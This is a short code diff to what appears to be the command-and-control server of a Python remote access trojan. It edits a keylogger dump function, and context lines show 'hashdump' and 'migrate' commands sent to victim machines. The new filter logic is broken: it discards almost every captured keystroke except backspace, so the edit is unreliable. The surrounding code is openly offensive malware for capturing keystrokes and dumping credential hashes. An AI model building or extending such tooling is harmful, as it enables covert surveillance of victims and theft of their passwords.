@@ -102,11 +102,14 @@ def stop_keylogger():
 def dump_keylogger_data():
     global keylogger_data
     filtered_data = []
-    skip_keys = {"backspace", "enter", "left shift", "right shift", "shift"}
+    skip_keys = {"enter", "left shift", "right shift", "shift"}
     for key in keylogger_data:
         if key in skip_keys:
             continue
-        filtered_data.append(key)
+        if key == "backspace":
+            filtered_data.append("backspace")
+        else:
+            filtered_data.append("")
     return ''.join(filtered_data)
 
 def handle_client(client_socket, addr):
@@ -129,7 +132,7 @@ def handle_client(client_socket, addr):
         if command == "hashdump":
             print(Fore.YELLOW + "[ * ] Starting...")
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE +  response)
+            print(Fore.WHITE + response)
 
         elif command == "migrate":
             print(Fore.YELLOW + "[ * ] Starting...")
